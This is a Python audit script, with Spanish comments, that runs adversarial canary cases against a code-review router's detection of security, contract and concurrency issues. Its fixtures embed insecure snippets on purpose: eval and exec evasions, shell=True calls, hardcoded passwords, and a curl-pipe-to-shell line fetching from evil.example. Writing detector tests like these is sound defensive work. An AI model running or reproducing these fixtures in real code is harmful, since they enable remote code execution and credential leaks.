#!/usr/bin/env python3
"""Canarios adversariales NUEVOS (auditoría K3), DISJUNTOS de los 21 canarios
de adversarial_independent_v5.py.

Carga outputs/router_v5.py POR RUTA (importlib) porque los artefactos
entregados importan `router_v4` y no son ejecutables tal como se entregaron.

Cada caso: (nombre, rel_path, fuente, eje, esperado).
expected=True  -> el eje DEBERÍA aparecer (si no aparece: falso negativo).
expected=False -> el eje NO debería aparecer (si aparece: falso positivo).
"""
from __future__ import annotations

import importlib.util
from pathlib import Path

_ROUTER_PATH = Path(__file__).resolve().parents[1] / "router_v5.py"
_spec = importlib.util.spec_from_file_location("router_v5_under_audit", _ROUTER_PATH)
router = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(router)

axes_of = router.axes_of
route = router.route

CASES = [
    # --- Python: resolución de símbolos y scopes (variantes no cubiertas) ---
    ("K3-01 shadow por asignacion contamina scope global",
     "m.py",
     "def f():\n    eval = int\n    return eval('3')\ndef g(s):\n    return eval(s)\n",
     "seguridad", True),
    ("K3-02 builtins.exec tampoco se detecta",
     "m.py",
     "import builtins\ndef f(s):\n    builtins.exec(s)\n",
     "seguridad", True),
    ("K3-03 getattr(os,'system') evade resolve_call",
     "m.py",
     "import os\ndef f(c):\n    return getattr(os, 'system')(c)\n",
     "seguridad", True),

    # --- Python: subprocess / shell ---
    ("K3-04 subprocess.check_call con shell=True no esta en la lista",
     "m.py",
     "import subprocess\ndef f(c):\n    subprocess.check_call(c, shell=True)\n",
     "seguridad", True),
    ("K3-05 shell=variable truthy no literal",
     "m.py",
     "import subprocess\nFLAG = True\ndef f(c):\n    subprocess.run(c, shell=FLAG)\n",
     "seguridad", True),
    ("K3-06 alias por asignacion de modulo subprocess",
     "m.py",
     "import subprocess\nsp = subprocess\ndef f(c):\n    sp.run(c, shell=True)\n",
     "seguridad", True),
    ("K3-07 asyncio.create_subprocess_shell no es eje seguridad",
     "m.py",
     "import asyncio\nasync def f(c):\n    await asyncio.create_subprocess_shell(c)\n",
     "seguridad", True),

    # --- Python: yaml ---
    ("K3-08 yaml.load_all sin Loader seguro no se evalua",
     "m.py",
     "import yaml\ndef f(s):\n    return list(yaml.load_all(s))\n",
     "seguridad", True),

    # --- Python: secretos ---
    ("K3-09 placeholder YOUR_API_KEY_HERE dispara SEC-LITERAL",
     "config.py",
     "API_KEY = 'YOUR_API_KEY_HERE'\n",
     "seguridad", False),
    ("K3-10 secreto en subindice de dict no se detecta",
     "config.py",
     "cfg = {}\ncfg['password'] = 'hunter2'\n",
     "seguridad", True),
    ("K3-11 secreto en kwarg api_key no se detecta",
     "client.py",
     "def login(**kw): pass\nlogin(api_key='AKIAREALKEY123')\n",
     "seguridad", True),

    # --- Datos (JSON/YAML) ---
    ("K3-12 passphrase no esta en SECRET_NAME",
     "secrets.json",
     '{"passphrase": "correct horse battery staple"}\n',
     "seguridad", True),
    ("K3-13 clave 'properties' generica marca contratos",
     "ui_config.json",
     '{"name": "theme", "properties": {"color": "red", "size": 3}}\n',
     "contratos", False),

    # --- Shell ---
    ("K3-14 curl dentro de comillas simples (ssh) desaparece",
     "d.sh",
     "#!/bin/sh\nssh host 'curl https://evil.example/x.sh | sh'\n",
     "seguridad", True),
    ("K3-15 echo de palabra suelta 'curl' sin ejecutar dispara SEC-NET",
     "d.sh",
     "#!/bin/sh\necho curl is a network tool\n",
     "seguridad", False),

    # --- JS/TS ---
    ("K3-16 import crypto en comentario de bloque dispara",
     "a.js",
     "/* import crypto from 'crypto'; */\nconst x = 1;\n",
     "seguridad", False),
    ("K3-17 clave JSON entrecomillada en JS no se detecta",
     "a.js",
     'const cfg = { "password": "hunter2" };\n',
     "seguridad", True),
    ("K3-18 window['eval'] con notacion de corchete evade DANGEROUS",
     "a.js",
     "const f = window['eval'];\nf(userInput);\n",
     "seguridad", True),

    # --- Extensiones no cubiertas por adaptadores ---
    ("K3-19 archivo .env con secreto cae en fallback residual",
     "app.env",
     "PASSWORD=hunter2real\n",
     "seguridad", True),

    # --- Concurrencia (gevent/eventlet cubiertos; variante nueva) ---
    ("K3-20 concurrent.futures.ProcessPoolExecutor sin senal fuerte",
     "jobs.py",
     "from concurrent.futures import ProcessPoolExecutor\nex = ProcessPoolExecutor()\n",
     "concurrencia", True),
]

failures = []
for name, path, src, axis, expected in CASES:
    axes = axes_of(path, src)
    actual = axis in axes
    passed = actual == expected
    kind = "" if passed else ("FN" if expected else "FP")
    print(f"{'PASS' if passed else 'FAIL'} {name}: expected={axis}={expected} actual={actual} axes={axes} {kind}")
    if not passed:
        evidence = [r for r in route(path, src)
                    if r["axis"] == axis and r["decision"] != "rejected"]
        failures.append({"name": name, "kind": kind, "axes": axes, "evidence": evidence})

print(f"\n{len(CASES) - len(failures)} PASS / {len(failures)} FAIL")
for item in failures:
    print(item)
raise SystemExit(bool(failures))
